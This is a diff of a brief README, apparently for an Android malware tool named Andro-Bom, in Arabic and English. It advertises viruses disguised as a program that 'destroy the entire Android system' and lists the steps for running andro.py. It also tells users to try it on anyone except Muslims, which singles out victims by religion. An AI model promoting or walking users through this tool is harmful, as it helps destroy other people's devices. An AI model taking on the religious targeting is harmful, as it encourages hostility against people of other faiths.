@@ -1,6 +1,8 @@
 فيروسات تدمير نظام الاندوريد كامل عبر فايروس ب هيئة برنامج
+
 عدم تجريبها على المسلمين جربها على اي دين إلا المسلمين
 Viruses destroy the entire Android system through a virus in the form of a program 
+
 Not to test it on Muslims, try it on any non-Muslim religion 
 __________________________________________________________________________________
 apt update 
@@ -17,7 +19,7 @@ cd Andro-Bom
 
 chmod +x *
 
-python3 andro.py
+python andro.py
 
 __________________________________________________________________________________
 🇵🇸👑Free Palestine 
